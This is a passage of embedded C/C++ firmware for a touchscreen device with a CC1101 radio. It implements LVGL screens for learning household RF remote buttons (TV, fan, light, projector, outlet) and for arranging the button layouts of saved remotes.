  start_new_universal_remote(e);
  set_status("CUSTOM RF COPY READY", COLOR_RF);
}


void smart_learn_unknown(lv_event_t *e) { begin_rf_smart_learn("UNKNOWN", e); }
void smart_learn_outlet(lv_event_t *e) { begin_rf_smart_learn("OUTLET / SWITCH", e); }
void smart_learn_light(lv_event_t *e) { begin_rf_smart_learn("LIGHT", e); }
void smart_learn_fan(lv_event_t *e) { begin_rf_smart_learn("FAN", e); }
void smart_learn_projector(lv_event_t *e) { begin_rf_smart_learn("PROJECTOR", e); }


void select_next_saved_remote(lv_event_t *e) {
  if (saved_remote_count == 0) {
    set_status("NO SAVED REMOTES", COLOR_MUTED);
    return;
  }
  selected_saved_index = (selected_saved_index + 1) % saved_remote_count;
  refresh_saved_summary();
}

// The editable remote pages are rebuilt whenever their button list changes.
// Remove every header indicator before LVGL deletes that page, so later
// status or battery updates never follow a freed LVGL pointer.
void forget_status_indicators_for(lv_obj_t *screen) {
  uint8_t kept = 0;
  for (uint8_t i = 0; i < status_indicator_count; i++) {
    if (lv_obj_get_parent(status_labels[i]) == screen ||
        lv_obj_get_parent(status_dots[i]) == screen) {
      continue;
    }
    status_labels[kept] = status_labels[i];
    status_dots[kept] = status_dots[i];
    kept++;
  }
  status_indicator_count = kept;

  kept = 0;
  for (uint8_t i = 0; i < battery_indicator_count; i++) {
    if (lv_obj_get_parent(battery_labels[i]) == screen) {
      continue;
    }
    battery_labels[kept++] = battery_labels[i];
  }
  battery_indicator_count = kept;

  kept = 0;
  for (uint8_t i = 0; i < connection_indicator_count; i++) {
    if (lv_obj_get_parent(wifi_link_labels[i]) == screen ||
        lv_obj_get_parent(ble_link_labels[i]) == screen) {
      continue;
    }
    wifi_link_labels[kept] = wifi_link_labels[i];
    ble_link_labels[kept] = ble_link_labels[i];
    kept++;
  }
  connection_indicator_count = kept;
}

// Saved remotes are displayed as a usable remote face rather than a generic
// list.  The labels learned by Guided Copy are enough to infer a familiar TV,
// streaming, or fan layout.  Unknown labels retain a grid below the face.
bool get_virtual_remote_button_bounds(const char *name,
                                      int &x, int &y, int &w, int &h) {
  // The saved-remote face is only 280 px wide.  Keep the four channel/volume
  // controls outside the D-pad footprint; the previous wider side buttons
  // overlapped LEFT/RIGHT and made those touch targets unreliable.
  w = 80;
  h = 36;
  if (strcmp(name, "POWER") == 0)      { x = 8;   y = 8;   return true; }
  if (strcmp(name, "INPUT") == 0 || strcmp(name, "LIGHT") == 0)
                                       { x = 100; y = 8;   return true; }
  if (strcmp(name, "MUTE") == 0 || strcmp(name, "TIMER") == 0)
                                       { x = 192; y = 8;   return true; }

  // The side controls are deliberately narrow.  Their display labels are
  // abbreviated below, while the saved command names remain unchanged.
  if (strcmp(name, "CHANNEL UP") == 0 || strcmp(name, "OSCILLATE") == 0)
                                       { x = 8;   y = 56;  w = 60; h = 34; return true; }
  if (strcmp(name, "CHANNEL DOWN") == 0)
                                       { x = 8;   y = 98;  w = 60; h = 34; return true; }
  if (strcmp(name, "VOLUME UP") == 0 || strcmp(name, "SPEED UP") == 0)
                                       { x = 212; y = 56;  w = 60; h = 34; return true; }
  if (strcmp(name, "VOLUME DOWN") == 0 || strcmp(name, "SPEED DOWN") == 0)
                                       { x = 212; y = 98;  w = 60; h = 34; return true; }

  // Compact D-pad, with a clear gap between it and the side controls.
  if (strcmp(name, "UP") == 0)         { x = 116; y = 54;  w = 48; h = 34; return true; }
  if (strcmp(name, "LEFT") == 0)       { x = 74;  y = 96;  w = 42; h = 34; return true; }
  if (strcmp(name, "SELECT") == 0)     { x = 119; y = 96;  w = 42; h = 34; return true; }
  if (strcmp(name, "RIGHT") == 0)      { x = 164; y = 96;  w = 42; h = 34; return true; }
  if (strcmp(name, "DOWN") == 0)       { x = 116; y = 138; w = 48; h = 34; return true; }
  if (strcmp(name, "BACK") == 0)       { x = 8;   y = 185; w = 128; h = 34; return true; }
  if (strcmp(name, "PLAY / PAUSE") == 0)
                                       { x = 144; y = 185; w = 128; h = 34; return true; }
  return false;
}


// Keep the stored command name intact, but use the short labels normally
// found on a physical remote where the compact side controls need them.
const char *get_virtual_remote_button_display_text(const char *name) {
  if (strcmp(name, "CHANNEL UP") == 0) return "CH +";
  if (strcmp(name, "CHANNEL DOWN") == 0) return "CH -";
  if (strcmp(name, "VOLUME UP") == 0) return "VOL +";
  if (strcmp(name, "VOLUME DOWN") == 0) return "VOL -";
  if (strcmp(name, "SPEED UP") == 0) return "SPD +";
  if (strcmp(name, "SPEED DOWN") == 0) return "SPD -";
  if (strcmp(name, "OSCILLATE") == 0) return "OSC";
  if (strcmp(name, "PLAY / PAUSE") == 0) return "PLAY";
  return name;
}


void style_virtual_remote_button_label(lv_obj_t *button, int width) {
  // Child zero is the inset accent line created by create_button.
  lv_obj_t *label = lv_obj_get_child(button, 0);
  if (label == NULL) return;
  lv_obj_set_width(label, width - 8);
  lv_label_set_long_mode(label, LV_LABEL_LONG_DOT);
  lv_obj_align(label, LV_ALIGN_CENTER, 0, 3);
}


bool get_default_virtual_remote_button_bounds(const char *name, uint8_t unknown_index,
                                              int &x, int &y, int &w, int &h) {
  if (get_virtual_remote_button_bounds(name, x, y, w, h)) return true;
  // Keep unknown/custom commands visible on the same 290 px remote face.
  x = 7 + (unknown_index % 3) * 92;
  y = 180 + (unknown_index / 3) * 42;
  w = 84;
  h = 34;
  return true;
}


SavedRemoteLayout *layout_for_saved_remote(bool is_ir, uint8_t index) {
  if (is_ir) {
    return index < MAX_IR_SAVED_REMOTES ? &saved_ir_layouts[index] : NULL;
  }
  return index < MAX_SAVED_REMOTES ? &saved_rf_layouts[index] : NULL;
}


bool get_saved_layout_button_bounds(bool is_ir, uint8_t remote_index,
                                    uint8_t button_index, const char *name,
                                    uint8_t unknown_index,
                                    int &x, int &y, int &w, int &h) {
  get_default_virtual_remote_button_bounds(name, unknown_index, x, y, w, h);
  SavedRemoteLayout *layout = layout_for_saved_remote(is_ir, remote_index);
  if (layout != NULL && layout->magic == SAVED_REMOTE_LAYOUT_MAGIC &&
      button_index < MAX_UNIVERSAL_BUTTONS) {
    x = layout->x[button_index];
    y = layout->y[button_index];
  }
  return true;
}


uint8_t remote_layout_button_count() {
  if (remote_layout_editing_ir) {
    return remote_layout_editing_remote_index < saved_ir_remote_count ?
      saved_ir_remotes[remote_layout_editing_remote_index].button_count : 0;
  }
  return remote_layout_editing_remote_index < saved_remote_count ?
    saved_remotes[remote_layout_editing_remote_index].button_count : 0;
}


const char *remote_layout_button_name(uint8_t button_index) {
  if (remote_layout_editing_ir) {
    return saved_ir_remotes[remote_layout_editing_remote_index].button_names[button_index];
  }
  return saved_remotes[remote_layout_editing_remote_index].button_names[button_index];
}


void refresh_remote_layout_editor();
void open_ir_remote_layout_editor(lv_event_t *e);
void open_rf_remote_layout_editor(lv_event_t *e);


void select_remote_layout_button(lv_event_t *e) {
  remote_layout_selected_button = (int8_t)(uintptr_t)lv_event_get_user_data(e);
  refresh_remote_layout_editor();
}


void move_remote_layout_button(int dx, int dy) {
  if (remote_layout_selected_button < 0 ||
      remote_layout_selected_button >= remote_layout_button_count()) {
    set_status("SELECT A BUTTON", COLOR_MUTED);
    return;
  }

  SavedRemoteLayout *layout = layout_for_saved_remote(
    remote_layout_editing_ir, remote_layout_editing_remote_index);
  if (layout == NULL) return;

  uint8_t index = (uint8_t)remote_layout_selected_button;
  int x, y, w, h;
  uint8_t unknown_index = 0;
  for (uint8_t i = 0; i <= index; i++) {
    bool is_unknown = !get_virtual_remote_button_bounds(remote_layout_button_name(i), x, y, w, h);
    if (i == index) {
      get_saved_layout_button_bounds(remote_layout_editing_ir,
                                     remote_layout_editing_remote_index, i,
                                     remote_layout_button_name(i), unknown_index,
                                     x, y, w, h);
      break;
    }
    if (is_unknown) unknown_index++;
  }

  x += dx;
  y += dy;
  x = constrain(x, 5, 285 - w);
  y = constrain(y, 5, 220 - h);
  layout->magic = SAVED_REMOTE_LAYOUT_MAGIC;
  layout->x[index] = x;
  layout->y[index] = y;
  refresh_remote_layout_editor();
  set_status("SYSTEM READY", COLOR_READY);
}


void move_remote_layout_left(lv_event_t *e)  { move_remote_layout_button(-10, 0); }
void move_remote_layout_right(lv_event_t *e) { move_remote_layout_button(10, 0); }
void move_remote_layout_up(lv_event_t *e)    { move_remote_layout_button(0, -10); }
void move_remote_layout_down(lv_event_t *e)  { move_remote_layout_button(0, 10); }


void reset_remote_layout(lv_event_t *e) {
  SavedRemoteLayout *layout = layout_for_saved_remote(
    remote_layout_editing_ir, remote_layout_editing_remote_index);
  if (layout == NULL) return;
  memset(layout, 0, sizeof(SavedRemoteLayout));
  remote_layout_selected_button = -1;
  refresh_remote_layout_editor();
}


void return_to_edited_remote(lv_event_t *e) {
  if (remote_layout_editing_ir) {
    refresh_ir_remote_builder();
    lv_scr_load(ir_remote_builder_screen);
  } else {
    refresh_universal_remote();
    lv_scr_load(universal_remote_screen);
  }
  set_status("SYSTEM READY", COLOR_READY);
}


void cancel_remote_layout_editor(lv_event_t *e) {
  SavedRemoteLayout *layout = layout_for_saved_remote(
    remote_layout_editing_ir, remote_layout_editing_remote_index);
  if (layout != NULL) *layout = remote_layout_before_edit;
  return_to_edited_remote(e);
}


void save_remote_layout_editor(lv_event_t *e) {
  persist_saved_remote_layouts();
  Serial.printf("Saved %s remote layout\n", remote_layout_editing_ir ? "IR" : "RF");
  return_to_edited_remote(e);
}


void ensure_remote_layout_screen() {
  if (remote_layout_screen != NULL) return;
  remote_layout_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(remote_layout_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(remote_layout_screen, LV_OPA_COVER, LV_PART_MAIN);
}


void refresh_remote_layout_editor() {
  ensure_remote_layout_screen();
  forget_status_indicators_for(remote_layout_screen);
  lv_obj_clean(remote_layout_screen);
  uint32_t color = remote_layout_editing_ir ? COLOR_IR : COLOR_RF;
  create_header(remote_layout_screen, remote_layout_editing_ir ? "EDIT IR LAYOUT" : "EDIT RF LAYOUT");

  remote_layout_hint_label = lv_label_create(remote_layout_screen);
  lv_label_set_text(remote_layout_hint_label,
                    remote_layout_selected_button < 0 ?
                    "Tap a command, then use arrows" : "Move selected command, then SAVE");
  lv_obj_set_style_text_color(remote_layout_hint_label, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(remote_layout_hint_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_style_text_align(remote_layout_hint_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(remote_layout_hint_label, LV_ALIGN_TOP_MID, 0, 76);

  lv_obj_t *surface = lv_obj_create(remote_layout_screen);
  lv_obj_set_size(surface, 290, 225);
  lv_obj_set_pos(surface, 15, 94);
  lv_obj_set_style_pad_all(surface, 5, LV_PART_MAIN);
  lv_obj_set_style_bg_color(surface, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
  lv_obj_set_style_border_color(surface, lv_color_hex(color), LV_PART_MAIN);
  lv_obj_set_style_border_width(surface, 1, LV_PART_MAIN);
  lv_obj_set_style_radius(surface, 10, LV_PART_MAIN);
  lv_obj_clear_flag(surface, LV_OBJ_FLAG_SCROLLABLE);

  uint8_t unknown_button_count = 0;
  for (uint8_t i = 0; i < remote_layout_button_count(); i++) {
    int x, y, w, h;
    int default_x, default_y, default_w, default_h;
    bool is_unknown = !get_virtual_remote_button_bounds(remote_layout_button_name(i),
                                                        default_x, default_y,
                                                        default_w, default_h);
    get_saved_layout_button_bounds(remote_layout_editing_ir,
                                   remote_layout_editing_remote_index, i,
                                   remote_layout_button_name(i), unknown_button_count,
                                   x, y, w, h);
    if (is_unknown) unknown_button_count++;
    lv_obj_t *button = create_button(surface, x, y, w, h,
                                     get_virtual_remote_button_display_text(remote_layout_button_name(i)),
                                     color, NULL);
    style_virtual_remote_button_label(button, w);
    if (i == (uint8_t)remote_layout_selected_button) {
      lv_obj_set_style_border_color(button, lv_color_hex(COLOR_GREEN), LV_PART_MAIN);
      lv_obj_set_style_border_width(button, 3, LV_PART_MAIN);
    }
    lv_obj_add_event_cb(button, select_remote_layout_button, LV_EVENT_CLICKED,
                        (void *)(uintptr_t)i);
  }

  create_button(remote_layout_screen, 15, 326, 88, 32, "LEFT", color, move_remote_layout_left);
  create_button(remote_layout_screen, 116, 326, 88, 32, "UP", color, move_remote_layout_up);
  create_button(remote_layout_screen, 217, 326, 88, 32, "RIGHT", color, move_remote_layout_right);
  create_button(remote_layout_screen, 15, 365, 88, 32, "DOWN", color, move_remote_layout_down);
  create_button(remote_layout_screen, 116, 365, 88, 32, "RESET", COLOR_MUTED, reset_remote_layout);
  create_button(remote_layout_screen, 217, 365, 88, 32, "SAVE", COLOR_GREEN, save_remote_layout_editor);
  create_button(remote_layout_screen, 70, 404, 180, 26, "CANCEL", COLOR_RED, cancel_remote_layout_editor);
  create_footer(remote_layout_screen);
}


void open_ir_remote_layout_editor(lv_event_t *e) {
  if (selected_ir_saved_index < 0 || selected_ir_saved_index >= saved_ir_remote_count) return;
  remote_layout_editing_ir = true;
  remote_layout_editing_remote_index = selected_ir_saved_index;
  remote_layout_before_edit = saved_ir_layouts[selected_ir_saved_index];
  remote_layout_selected_button = -1;
  refresh_remote_layout_editor();
  lv_scr_load(remote_layout_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void open_rf_remote_layout_editor(lv_event_t *e) {
  if (selected_saved_index < 0 || selected_saved_index >= saved_remote_count) return;
  remote_layout_editing_ir = false;
  remote_layout_editing_remote_index = selected_saved_index;
  remote_layout_before_edit = saved_rf_layouts[selected_saved_index];
  remote_layout_selected_button = -1;
  refresh_remote_layout_editor();
  lv_scr_load(remote_layout_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void refresh_universal_remote() {

  if (
    universal_remote_screen == NULL
  ) {
    return;
  }

  forget_status_indicators_for(universal_remote_screen);

  lv_obj_clean(
    universal_remote_screen
  );


  create_header(
    universal_remote_screen,
    universal_remote_loaded_from_save ? "SAVED RF REMOTE" : "LEARN REMOTE"
  );


  lv_obj_t *remote_list = lv_obj_create(universal_remote_screen);
  lv_obj_set_size(remote_list, 290, 245);
  lv_obj_set_pos(remote_list, 15, universal_remote_loaded_from_save ? 95 : 115);
  lv_obj_set_style_pad_all(remote_list, 5, LV_PART_MAIN);
  lv_obj_set_style_bg_color(remote_list, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
  lv_obj_set_style_border_color(remote_list, lv_color_hex(COLOR_RF), LV_PART_MAIN);
  lv_obj_set_style_border_width(remote_list, 1, LV_PART_MAIN);
  lv_obj_set_style_radius(remote_list, 10, LV_PART_MAIN);
  lv_obj_set_scroll_dir(remote_list, LV_DIR_VER);

  if (!universal_remote_loaded_from_save) {
    lv_obj_t *learn_context = lv_label_create(universal_remote_screen);
    const uint8_t safe_profile_index =
      rf_profile_index < RF_PROFILE_COUNT ? rf_profile_index : 0;
    const char *safe_category =
      rf_smart_learn_category != NULL ? rf_smart_learn_category : "UNKNOWN";
    lv_label_set_text_fmt(learn_context, "DEVICE: %s  |  %.3f MHz %s",
                          safe_category,
                          RF_PROFILES[safe_profile_index].frequency,
                          RF_PROFILES[safe_profile_index].ook ? "OOK" : "FSK");
    lv_obj_set_style_text_color(learn_context, lv_color_hex(COLOR_RF), LV_PART_MAIN);
    lv_obj_set_style_text_font(learn_context, &lv_font_montserrat_12, LV_PART_MAIN);
    lv_obj_set_style_text_align(learn_context, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
    lv_obj_align(learn_context, LV_ALIGN_TOP_MID, 0, 91);
  }

  int y = 5;
  uint8_t unknown_button_count = 0;

  for (int i = 0; i < universal_button_count; i++) {
    if (universal_remote_loaded_from_save) {
      int tile_x, tile_y, tile_w, tile_h;
      bool is_unknown = !get_virtual_remote_button_bounds(universal_button_names[i],
                                                           tile_x, tile_y, tile_w, tile_h);
      get_saved_layout_button_bounds(false, selected_saved_index, i,
                                     universal_button_names[i], unknown_button_count,
                                     tile_x, tile_y, tile_w, tile_h);
      if (is_unknown) unknown_button_count++;
      lv_obj_t *button = create_button(remote_list, tile_x, tile_y, tile_w, tile_h,
                                       get_virtual_remote_button_display_text(universal_button_names[i]),
                                       COLOR_RF, NULL);
      style_virtual_remote_button_label(button, tile_w);
      lv_obj_add_event_cb(button, send_saved_rf_button, LV_EVENT_CLICKED,
                          (void *)(uintptr_t)i);
    } else {
      create_button(remote_list, 10, y, 260, 38,
                    universal_button_names[i], COLOR_RF, NULL);
      y += 45;
    }
  }


  if (!universal_remote_loaded_from_save && universal_button_count < MAX_UNIVERSAL_BUTTONS) {

    create_button(
      remote_list,
      25,
      y,
      230,
      45,
      "ADD ANOTHER BUTTON",
      COLOR_GREEN,
      add_universal_button
    );

  } else if (!universal_remote_loaded_from_save) {

    create_button(
      remote_list,
      25,
      y,
      230,
      45,
      "REMOTE FULL",
      COLOR_RED,
      NULL
    );
  }


  if (universal_remote_loaded_from_save) {
    create_button(universal_remote_screen, 10, 350, 66, 40, "RF", COLOR_RF, open_rf);
    create_button(universal_remote_screen, 86, 350, 66, 40, "MOVE", COLOR_RF,
                  open_rf_remote_layout_editor);
    create_button(universal_remote_screen, 162, 350, 66, 40, "BACK", COLOR_SAVED, open_saved);
    create_button(universal_remote_screen, 238, 350, 72, 40, "HOME", COLOR_RF, go_home);
  } else {
    create_button(universal_remote_screen, 15, 370, 88, 40, "RF MENU", COLOR_RF, open_rf);


    create_button(universal_remote_screen, 108, 370, 104, 40, "FINISH REMOTE", COLOR_GREEN,
                  save_universal_remote);
    create_button(universal_remote_screen, 224, 370, 81, 40, "HOME", COLOR_RF, go_home);
  }


  create_footer(
    universal_remote_screen
  );
}


// ============================================================
// CREATE UNIVERSAL SCREEN
// ============================================================

void create_universal_screen() {

  rf_universal_screen =
    lv_obj_create(NULL);


  lv_obj_set_style_bg_color(
    rf_universal_screen,
    lv_color_hex(COLOR_BG),
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_opa(
    rf_universal_screen,
    LV_OPA_COVER,
    LV_PART_MAIN
  );

  create_cyber_background(rf_universal_screen, true);


  create_header(
    rf_universal_screen,
    "LEARN REMOTE"
  );


  lv_obj_t *info =
    lv_label_create(
      rf_universal_screen
    );


  lv_label_set_text(
    info,
    "Choose the device type, then press\nthe same remote button 3 times.\n\nFixed-code remotes work best."
  );


  lv_obj_set_style_text_color(
    info,
    lv_color_hex(COLOR_MUTED),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    info,
    &lv_font_montserrat_14,
    LV_PART_MAIN
  );


  lv_obj_set_style_text_align(
    info,
    LV_TEXT_ALIGN_CENTER,
    LV_PART_MAIN
  );


  lv_obj_align(
    info,
    LV_ALIGN_TOP_MID,
    0,
    108
  );


  create_button(
    rf_universal_screen,
    20,
    188,
    135,
    40,
    "UNKNOWN",
    COLOR_RF,
    smart_learn_unknown
  );


  create_button(rf_universal_screen, 165, 188, 135, 40, "OUTLET", COLOR_GREEN,
                smart_learn_outlet);
  create_button(rf_universal_screen, 20, 238, 135, 40, "LIGHT", COLOR_SETTINGS,
                smart_learn_light);
  create_button(rf_universal_screen, 165, 238, 135, 40, "FAN", COLOR_SAVED,
                smart_learn_fan);
  create_button(rf_universal_screen, 20, 288, 280, 38, "PROJECTOR", COLOR_IR,
                smart_learn_projector);
  create_button(rf_universal_screen, 45, 336, 230, 36, "OPEN WORKING REMOTE", COLOR_RF,
                open_universal_remote);

  create_button(
    rf_universal_screen,
    70,
    388,
    180,
    30,
    "BACK TO RF MENU",
    COLOR_RF,
    open_rf
  );


  create_footer(
    rf_universal_screen
  );
}


// ============================================================
// OPEN UNIVERSAL REMOTE
// ============================================================

void open_universal_remote(
  lv_event_t *e
) {

  refresh_universal_remote();


  lv_scr_load(
    universal_remote_screen
  );


  set_status(
    "UNKNOWN REMOTE",
    COLOR_RF
  );
}


// ============================================================
// KNOWN DEVICE SETUP
// ============================================================

void load_tv_steps() {

  current_device_name =
    "TV";


  current_steps[0] =
    "POWER";

  current_steps[1] =
    "VOLUME UP";

  current_steps[2] =
    "VOLUME DOWN";

  current_steps[3] =
    "CHANNEL UP";

  current_steps[4] =
    "CHANNEL DOWN";

  current_steps[5] =
    "MUTE";

  current_steps[6] =
    "INPUT";

  current_steps[7] =
    "BACK";

  current_steps[8] =
    "UP";

  current_steps[9] =
    "DOWN";

  current_steps[10] =
    "LEFT";

  current_steps[11] =
    "RIGHT";


  current_step_count =
    12;

  current_step_index =
    0;
}


void load_fan_steps() {

  current_device_name =
    "FAN";


  current_steps[0] =
    "POWER";

  current_steps[1] =
    "SPEED UP";

  current_steps[2] =
    "SPEED DOWN";

  current_steps[3] =
    "OSCILLATE";

  current_steps[4] =
    "LIGHT";


  current_step_count =
    5;

  current_step_index =
    0;
}


void load_light_steps() {

  current_device_name =
    "LIGHT";


  current_steps[0] =
    "POWER";

  current_steps[1] =
    "BRIGHTER";

  current_steps[2] =
    "DIMMER";

  current_steps[3] =
    "MODE";


  current_step_count =
    4;

  current_step_index =
    0;
}


void load_projector_steps() {

  current_device_name =
    "PROJECTOR";


  current_steps[0] =
    "POWER";

  current_steps[1] =
    "SOURCE";

  current_steps[2] =
    "MENU";


  current_step_count =
    3;

  current_step_index =
    0;
}


void load_outlet_steps() {
  current_device_name = "OUTLET / SWITCH";
  current_steps[0] = "ON";
  current_steps[1] = "OFF";
  current_step_count = 2;
  current_step_index = 0;
}


void load_custom_steps() {

  current_device_name =
    "CUSTOM";

  current_steps[0] = "BUTTON 1";
  current_steps[1] = "BUTTON 2";
  current_steps[2] = "BUTTON 3";
  current_steps[3] = "BUTTON 4";
  current_steps[4] = "BUTTON 5";

  current_step_count = 5;
  current_step_index = 0;
}


// ============================================================
// UPDATE KNOWN CAPTURE SCREEN
// ============================================================

void update_known_capture_screen() {

  if (
    known_instruction_label == NULL ||
    known_progress_label == NULL
  ) {
    return;
  }


  if (
    current_step_index >=
    current_step_count
  ) {

    lv_label_set_text(known_instruction_label,
                      "REMOTE LEARNING COMPLETE\nREVIEW OR FINISH REMOTE");


    lv_label_set_text(
      known_progress_label,
      "All selected buttons are ready"
    );


    set_status(
      "REMOTE LEARNING COMPLETE",
      COLOR_GREEN
    );

    rf_guided_learning_active = false;
    if (known_learn_button != NULL) lv_obj_add_flag(known_learn_button, LV_OBJ_FLAG_HIDDEN);
    if (known_skip_button != NULL) lv_obj_add_flag(known_skip_button, LV_OBJ_FLAG_HIDDEN);
    if (known_review_button != NULL) lv_obj_clear_flag(known_review_button, LV_OBJ_FLAG_HIDDEN);


    return;
  }


  char instruction[80];

  snprintf(
    instruction,
    sizeof(instruction),
    "%s\n\nReady to learn %s",
    current_device_name,
    current_steps[
      current_step_index
    ]
  );


  lv_label_set_text(
    known_instruction_label,
    instruction
  );


  char progress[40];

  snprintf(
    progress,
    sizeof(progress),
    "%d / %d",
    current_step_index + 1,
    current_step_count
  );


  lv_label_set_text(
    known_progress_label,
    progress
  );

  if (known_learn_button != NULL) lv_obj_clear_flag(known_learn_button, LV_OBJ_FLAG_HIDDEN);
  if (known_skip_button != NULL) lv_obj_clear_flag(known_skip_button, LV_OBJ_FLAG_HIDDEN);
  if (known_review_button != NULL) lv_obj_add_flag(known_review_button, LV_OBJ_FLAG_HIDDEN);
}


// ============================================================
// CAPTURE KNOWN STEP
// ============================================================

void capture_known_step(
  lv_event_t *e
) {
  if (!cc1101_ready) {
    set_status("CC1101 NOT READY", COLOR_RED);
    return;
  }
  if (current_step_index >= current_step_count) return;

  rf_learn_sample_count = 0;
  rf_rolling_confirmation_pending = false;
  memset(rf_learn_frames, 0, sizeof(rf_learn_frames));
  memset(rf_learn_sample_clean, 0, sizeof(rf_learn_sample_clean));
  if (rf_capture_instruction_label != NULL) {
    lv_label_set_text_fmt(rf_capture_instruction_label,
                          "%s: %s\n\nWait briefly, then press the\nSAME button three separate times",
                          current_device_name, current_steps[current_step_index]);
  }
  lv_scr_load(universal_capture_screen);
  start_next_rf_learning_sample(e);
}


// ============================================================
// SKIP KNOWN STEP
// ============================================================

void skip_known_step(
  lv_event_t *e
) {

  current_step_index++;


  set_status(
    "SKIPPED",
    COLOR_MUTED
  );


  update_known_capture_screen();
}


void review_guided_rf_remote(lv_event_t *e) {
  rf_guided_learning_active = false;
  refresh_universal_remote();
  lv_scr_load(universal_remote_screen);
  set_status("LEARNED REMOTE READY", COLOR_GREEN);
}


void begin_guided_rf_learning(lv_event_t *e) {
  if (!cc1101_ready) {
    set_status("CC1101 NOT READY", COLOR_RED);
    return;
  }
  rf_smart_learn_category = current_device_name;

  universal_button_count = 0;
  memset(universal_button_names, 0, sizeof(universal_button_names));
  memset(universal_working_rf_commands, 0, sizeof(universal_working_rf_commands));
  universal_remote_loaded_from_save = false;
  rf_guided_learning_active = true;
  rf_learn_sample_count = 0;
  rf_rolling_confirmation_pending = false;
  memset(rf_learn_frames, 0, sizeof(rf_learn_frames));
  memset(rf_learn_sample_clean, 0, sizeof(rf_learn_sample_clean));

  update_known_capture_screen();
  lv_scr_load(known_capture_screen);
  set_status("LEARN REMOTE READY", COLOR_RF);
}


// ============================================================
// DEVICE TYPE EVENTS
// ============================================================

void open_tv_setup(
  lv_event_t *e
) {

  load_tv_steps();

  begin_guided_rf_learning(e);
}


void open_fan_setup(
  lv_event_t *e
) {

  load_fan_steps();

  begin_guided_rf_learning(e);
}


void open_light_setup(
  lv_event_t *e
) {

  load_light_steps();

  begin_guided_rf_learning(e);
}


void open_projector_setup(
  lv_event_t *e
) {

  load_projector_steps();
  begin_guided_rf_learning(e);
}

void open_outlet_setup(lv_event_t *e) {
  load_outlet_steps();
  begin_guided_rf_learning(e);
}

void open_custom_setup(lv_event_t *e) {
  begin_rf_smart_learn("OTHER / UNKNOWN", e);
}


// ============================================================
// CREATE KNOWN CAPTURE SCREEN
// ============================================================

void create_known_capture_screen() {

  known_capture_screen =
    lv_obj_create(NULL);


  lv_obj_set_style_bg_color(
    known_capture_screen,
    lv_color_hex(COLOR_BG),
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_opa(
    known_capture_screen,
    LV_OPA_COVER,
    LV_PART_MAIN
  );

  create_cyber_background(known_capture_screen, true);


  create_header(
    known_capture_screen,
    "COPY RF BUTTON"
  );


  known_progress_label =
    lv_label_create(
      known_capture_screen
    );


  lv_label_set_text(
    known_progress_label,
    "1 / 1"
  );


  lv_obj_set_style_text_color(
    known_progress_label,
    lv_color_hex(COLOR_RF),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    known_progress_label,
    &lv_font_montserrat_12,
    LV_PART_MAIN
  );


  lv_obj_align(
    known_progress_label,
    LV_ALIGN_TOP_RIGHT,
    -25,
    78
  );


  known_instruction_label =
    lv_label_create(
      known_capture_screen
    );


  lv_label_set_text(
    known_instruction_label,
    "SELECT A DEVICE"
  );


  lv_obj_set_style_text_color(
    known_instruction_label,
    lv_color_hex(COLOR_TEXT),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    known_instruction_label,
    &lv_font_montserrat_16,
    LV_PART_MAIN
  );


  lv_obj_set_style_text_align(
    known_instruction_label,
    LV_TEXT_ALIGN_CENTER,
    LV_PART_MAIN
  );


  lv_obj_align(
    known_instruction_label,
    LV_ALIGN_TOP_MID,
    0,
    140
  );


  known_learn_button = create_button(
    known_capture_screen,
    55,
    250,
    210,
    48,
    "LEARN THIS BUTTON",
    COLOR_GREEN,
    capture_known_step
  );


  known_skip_button = create_button(
    known_capture_screen,
    55,
    310,
    210,
    48,
    "SKIP THIS BUTTON",
    COLOR_SETTINGS,
    skip_known_step
  );


  known_review_button = create_button(
    known_capture_screen,
    55,
    250,
    210,
    48,
    "REVIEW REMOTE",
    COLOR_GREEN,
    review_guided_rf_remote
  );
  lv_obj_add_flag(known_review_button, LV_OBJ_FLAG_HIDDEN);


  create_button(
    known_capture_screen,
    55,
    370,
    210,
    40,
    "CANCEL COPY",
    COLOR_RED,
    open_known
  );


  create_footer(
    known_capture_screen
  );
}


// ============================================================
// CREATE DEVICE TYPE SCREEN
// ============================================================

void create_device_type_screen() {

  device_type_screen =
    lv_obj_create(NULL);


  lv_obj_set_style_bg_color(
    device_type_screen,
    lv_color_hex(COLOR_BG),
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_opa(
    device_type_screen,
    LV_OPA_COVER,
    LV_PART_MAIN
  );

  create_cyber_background(device_type_screen, true);


  create_header(
    device_type_screen,
    "WHAT TYPE OF REMOTE?"
  );


  create_button(
    device_type_screen,
    25,
    105,
    130,
    55,
    "TV",
    COLOR_RF,
    open_tv_setup
  );


  create_button(
    device_type_screen,
    165,
    105,
    130,
    55,
    "FAN",
    COLOR_GREEN,
    open_fan_setup
  );


  create_button(
    device_type_screen,
    25,
    175,
    130,
    55,
    "LIGHT",
    COLOR_SETTINGS,
    open_light_setup
  );


  create_button(
    device_type_screen,
    165,
    175,
    130,
    55,
    "PROJECTOR",
    COLOR_SAVED,
    open_projector_setup
  );


  create_button(
    device_type_screen,
    25,
    245,
    130,
    50,
    "OUTLET / SWITCH",
    COLOR_BLUETOOTH,
    open_outlet_setup
  );


  create_button(
    device_type_screen,
    165,
    245,
    130,
    50,
    "CUSTOM / UNKNOWN",
    COLOR_MUTED,
    open_custom_setup
  );


  create_button(
    device_type_screen,
    70,
    320,
    180,
    45,
    "BACK",
    COLOR_RF,
    open_known
  );


  create_footer(
    device_type_screen
  );
}


// ============================================================
// OPEN DEVICE TYPE SCREEN
// ============================================================

void open_device_types(
  lv_event_t *e
) {

  lv_scr_load(
    device_type_screen
  );


  set_status(
    "SELECT DEVICE",
    COLOR_RF
  );
}


// ============================================================
